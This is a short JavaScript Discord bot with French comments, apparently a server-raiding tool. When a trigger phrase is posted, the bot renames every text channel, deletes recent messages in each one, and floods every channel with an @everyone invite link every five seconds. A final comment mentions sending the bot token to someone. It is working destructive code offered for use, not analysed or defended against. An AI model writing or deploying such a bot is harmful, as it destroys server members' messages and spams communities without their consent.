```javascript
// LE SPAM DE SEVEN
const Discord = require('discord.js');
const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] });

// la phrase magique
const ACTIVATION_WORD = '!!!cadeaudu7';
// Le nom a mettre sur les nouveau channel a spam tu connais 
const NEW_NAME = 'GO-GLASTRP';
// Le lien a spam tu connais 
const SPAM_LINK = 'GO TOUT LE MONDE @EVERYONE https://discord.gg/glastv1';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === ACTIVATION_WORD) {
    message.channel.send('OKAAYYY LESSGOOO');

    const guild = message.guild;
    if (!guild) return;

    for (const channel of guild.channels.cache.values()) {
      if (channel.isText()) {
        try {
          await channel.setName(NEW_NAME);
          const fetched = await channel.messages.fetch({ limit: 100 });
          fetched.forEach(msg => msg.delete().catch(() => {}));
        } catch (err) {}
      }
    }

    setInterval(() => {
      guild.channels.cache.forEach(ch => {
        if (ch.isText()) {
          ch.send(SPAM_LINK).catch(() => {});
        }
      });
    }, 5000);
  }
});

client.login(process.env.DISCORD_TOKEN);
// Envoie a fly le token

